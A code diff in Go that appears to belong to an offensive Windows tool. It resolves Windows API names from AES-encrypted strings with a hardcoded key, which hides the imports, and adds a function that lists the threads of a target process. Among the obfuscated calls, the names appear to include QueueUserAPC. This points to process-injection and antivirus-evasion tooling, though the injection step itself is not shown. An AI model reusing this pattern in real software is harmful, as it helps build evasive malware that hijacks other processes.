@@ -22,7 +22,27 @@ var OT_str string = GetAESDecrypted_aux("d2rGOn2S1EsrYl+GQfh5UQ==", "N33dl3N33dl
 var QUAPC_str string = GetAESDecrypted_aux("jr1ldiiDZqkXSxn0PTnjPg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
 var CH_str string = GetAESDecrypted_aux("I9BzKP3vnDqJJPYVcV38dw==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
 var CPA_str string = GetAESDecrypted_aux("vh75BCTVuMcYSGVlPwepdw==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
+var CT32S_str string = GetAESDecrypted_aux("g/n9hfw7niVL7CLsh41CgpePOByTTsFMxU2f+AeHxtE=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
 
+
+///////////////
+// Structs ///
+///////////////
+
+type ThreadEntry32 struct {
+   Size           uint32
+   tUsage         uint32
+   ThreadID       uint32
+   OwnerProcessID uint32
+   BasePri        int32
+   DeltaPri       int32
+   Flags          uint32
+}
+
+
+///////////////
+// API calls //
+///////////////
 
 func NGNP(handle uintptr, MAX_ALLOWED int, param3 int, param4 int, outHandle uintptr) uintptr {
    ret, _, _ := syscall.NewLazyDLL(ntdll_str).NewProc(NGNP_str).Call(
@@ -185,4 +205,38 @@ func CP(lpApplicationName string, lpCommandLine string, lpProcessAttributes uint
 
    )
    return uintptr(ret)
+}
+
+
+func CT32S(dwFlags uintptr, th32ProcessID uint) uintptr {
+   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(CT32S_str).Call(
+      uintptr(dwFlags),
+      uintptr(th32ProcessID),
+   )
+   return uintptr(ret)
+}
+
+
+///////////////
+//// Other ////
+///////////////
+
+func GetThreads(pid uintptr) []uint32 {
+   var thread_ids_slice []uint32;
+   var snapshot uintptr = CT32S(0x00000004, 0);
+   
+
+   var te ThreadEntry32;
+   te.Size = uint32(unsafe.Sizeof(te));
+   T32F(uintptr(snapshot), uintptr(unsafe.Pointer(&te)));
+ 
+   for{
+
+      if (T32N(uintptr(snapshot), uintptr(unsafe.Pointer(&te))) == 0) { break }
+      if (te.OwnerProcessID == uint32(pid)){
+         thread_ids_slice = append(thread_ids_slice, te.ThreadID)
+      }
+   }
+   CH(uintptr(snapshot));
+   return thread_ids_slice;
 }
